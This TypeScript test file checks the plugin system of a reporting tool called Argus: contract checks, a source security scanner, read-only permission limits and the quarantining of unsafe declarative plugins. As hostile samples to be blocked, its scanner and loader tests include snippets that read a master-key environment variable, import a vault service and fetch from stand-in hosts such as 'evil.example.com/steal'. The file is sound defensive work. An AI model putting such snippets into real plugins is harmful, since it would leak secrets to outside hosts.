import { describe, test, expect, afterEach } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { listReports, getQuarantinedPlugins, getReport, reloadReports } from "../src/services/reports/registry";
import { BUILTIN_REPORT_PLUGINS } from "../src/services/reports/registry.generated";
import { isAllowedReadOnlyPermission, scanPluginSource } from "../src/plugins/security";
import { loadDeclarativePlugins } from "../src/plugins/declarative";
import {
  DECLARATIVE_EXAMPLES_DIR,
  checkBuiltinFolder,
  checkPluginContract,
  collectRegistryTargets,
  declarativeTarget,
  findDuplicateIds,
  listBuiltinPluginFolders,
  parsePluginFixture,
} from "../src/services/reports/plugin-contract";

/**
 * Snapshot every report the runtime registry exposes with the shipped
 * declarative examples mounted as the runtime plugin dir, so the contract runs
 * over built-in AND declarative plugins (one test per plugin).
 */
function collectWithExamples() {
  const prior = process.env.ARGUS_PLUGINS_DIR;
  process.env.ARGUS_PLUGINS_DIR = DECLARATIVE_EXAMPLES_DIR;
  reloadReports();
  try {
    return collectRegistryTargets();
  } finally {
    if (prior === undefined) delete process.env.ARGUS_PLUGINS_DIR;
    else process.env.ARGUS_PLUGINS_DIR = prior;
    reloadReports();
  }
}
const { targets: REGISTRY_TARGETS, errors: REGISTRY_TARGET_ERRORS } = collectWithExamples();

describe("Plugin SDK, Security Sandbox & Fixture Contracts", () => {
  const tempDirs: string[] = [];
  afterEach(() => {
    delete process.env.ARGUS_PLUGINS_DIR;
    reloadReports();
    for (const d of tempDirs.splice(0)) rmSync(d, { recursive: true, force: true });
  });

  test("every built-in folder is registered, has its files, and passes the source security scan", () => {
    const folders = listBuiltinPluginFolders();
    expect(folders.length).toBeGreaterThanOrEqual(26);
    expect(BUILTIN_REPORT_PLUGINS.length).toBe(folders.length);
    expect(getQuarantinedPlugins()).toEqual([]);
    const builtinIds = listReports()
      .filter((r) => r.source === "builtin")
      .map((r) => r.id)
      .sort();
    expect(builtinIds).toEqual(folders);
    for (const folder of folders) expect(checkBuiltinFolder(folder)).toEqual([]);
  });

  test("registry exposes built-in AND declarative plugins for the contract run", () => {
    const sources = new Set(REGISTRY_TARGETS.map((t) => t.source));
    expect(sources.has("builtin")).toBe(true);
    expect(sources.has("declarative")).toBe(true);
    expect(REGISTRY_TARGET_ERRORS).toEqual([]);
    expect(findDuplicateIds(REGISTRY_TARGETS.map((t) => ({ id: (t.plugin as { id: string }).id, label: t.label })))).toEqual([]);
  });

  for (const target of REGISTRY_TARGETS) {
    test(`contract: ${target.source} ${(target.plugin as { id: string }).id}`, async () => {
      expect(target.fixture).toBeDefined();
      const result = await checkPluginContract(target);
      expect(result.errors).toEqual([]);
    });
  }

  test("contract reports a declarative plugin without a fixture clearly", async () => {
    const entry = loadDeclarativePlugins(DECLARATIVE_EXAMPLES_DIR).entries[0];
    const result = await checkPluginContract({ ...declarativeTarget(entry), fixture: undefined });
    expect(result.errors.some((e) => e.includes("missing inline `fixtures` block"))).toBe(true);
  });

  test("contract rejects declared-column drift, malformed fixtures, and duplicate ids", async () => {
    const entry = loadDeclarativePlugins(DECLARATIVE_EXAMPLES_DIR).entries.find((e) => e.spec.query.mode === "json")!;
    const drift = await checkPluginContract({ ...declarativeTarget(entry), declaredColumns: ["displayName", "nope"] });
    expect(drift.errors.some((e) => e.includes("do not match declared columns"))).toBe(true);

    const bad = await checkPluginContract({ ...declarativeTarget(entry), fixture: { params: [] } });
    expect(bad.errors).toContain("fixture.params must be an object");
    expect(bad.errors).toContain("fixture must declare rows[] or csvRows[]");

    expect(parsePluginFixture([{ a: 1 }]).ok).toBe(true);
    expect(findDuplicateIds([{ id: "x", label: "a" }, { id: "x", label: "b" }])).toHaveLength(1);
  });

  test("contract flags missing metadata and over-cap row output", async () => {
    const base = BUILTIN_REPORT_PLUGINS[0];
    const noMetrics = await checkPluginContract({
      label: "synthetic",
      source: "builtin",
      plugin: { ...base, metrics: undefined },
      fixture: { rows: [] },
    });
    expect(noMetrics.errors.some((e) => e.startsWith("metrics must list"))).toBe(true);

    const overCap = await checkPluginContract({
      label: "synthetic",
      source: "builtin",
      plugin: {
        ...base,
        summarize: () => ({ count: 60, variables: {}, rows: Array.from({ length: 60 }, (_, i) => ({ i })) }),
      },
      fixture: { rows: [] },
    });
    expect(overCap.errors.some((e) => e.includes("row cap"))).toBe(true);
  });

  test("security scanner blocks dangerous imports, vault/db access, env, and raw fetch", () => {
    expect(scanPluginSource('import { readFileSync } from "node:fs";', "bad.ts").length).toBe(1);
    expect(scanPluginSource('import { vaultService } from "@/services/vault/vault";', "bad.ts").length).toBe(1);
    expect(scanPluginSource("const k = process.env.ARGUS_MASTER_KEY;", "bad.ts").length).toBe(1);
    expect(scanPluginSource('const r = await fetch("https://evil.test");', "bad.ts").length).toBe(1);
    expect(scanPluginSource("export const ok = 1;", "good.ts")).toEqual([]);
  });

  test("read-only permission boundary rejects write and mail scopes", () => {
    expect(isAllowedReadOnlyPermission("AuditLog.Read.All", "my-report")).toBe(true);
    expect(isAllowedReadOnlyPermission("Directory.Read.All", "my-report")).toBe(true);
    expect(isAllowedReadOnlyPermission("User.ReadBasic.All", "my-report")).toBe(true);
    expect(isAllowedReadOnlyPermission("User.ReadWrite.All", "my-report")).toBe(false);
    expect(isAllowedReadOnlyPermission("Mail.Send", "my-report")).toBe(false);
    expect(isAllowedReadOnlyPermission("RoleManagement.ReadWrite.Directory", "my-report")).toBe(false);
    expect(isAllowedReadOnlyPermission("(depends on endpoint)", "manual-graph-query")).toBe(true);
    expect(isAllowedReadOnlyPermission("(depends on endpoint)", "other-plugin")).toBe(false);
  });

  test("declarative runtime loader loads valid YAML/JSON plugins and quarantines unsafe ones", async () => {
    const dir = mkdtempSync(join(tmpdir(), "argus-decl-"));
    tempDirs.push(dir);
    mkdirSync(dir, { recursive: true });

    writeFileSync(
      join(dir, "safe-groups.yaml"),
      `apiVersion: argus.report/v1
id: custom-sec-groups
version: 1.0.0
name: Security Groups Inventory
category: identity
description: Tracks security-enabled groups across Microsoft Entra ID.
requiredPermissions:
  - Group.Read.All
baselineSupport: true
recommendedSchedule: weekly
query:
  endpoint: /groups?$filter=securityEnabled eq true&$select=id,displayName
  mode: json
  rowLimit: 25
  columns:
    - id
    - displayName
  rowKeyColumn: id
`,
      "utf8",
    );

    writeFileSync(
      join(dir, "unsafe-write.json"),
      JSON.stringify({
        apiVersion: "argus.report/v1",
        id: "unsafe-write-plugin",
        version: "1.0.0",
        name: "Unsafe Plugin",
        category: "security",
        description: "Requests write access which must be blocked.",
        requiredPermissions: ["User.ReadWrite.All"],
        baselineSupport: false,
        query: { endpoint: "/users", columns: ["id"] },
      }),
      "utf8",
    );

    writeFileSync(
      join(dir, "ssrf-attempt.json"),
      JSON.stringify({
        apiVersion: "argus.report/v1",
        id: "ssrf-attempt",
        version: "1.0.0",
        name: "SSRF Attempt",
        category: "custom",
        description: "Tries to point query at an external host.",
        requiredPermissions: ["User.Read.All"],
        baselineSupport: false,
        query: { endpoint: "https://evil.example.com/steal", columns: ["id"] },
      }),
      "utf8",
    );

    const { plugins, quarantined } = loadDeclarativePlugins(dir);
    expect(plugins).toHaveLength(1);
    expect(plugins[0].id).toBe("custom-sec-groups");
    expect(plugins[0].source).toBe("declarative");
    expect(quarantined.length).toBe(2);

    process.env.ARGUS_PLUGINS_DIR = dir;
    reloadReports();
    const loaded = getReport("custom-sec-groups");
    expect(loaded).toBeDefined();
    const summary = loaded!.summarize([{ id: "g1", displayName: "SOC Team" }]);
    expect(summary.count).toBe(1);
    expect(summary.rows?.[0]).toEqual({ id: "g1", displayName: "SOC Team" });
  });
});
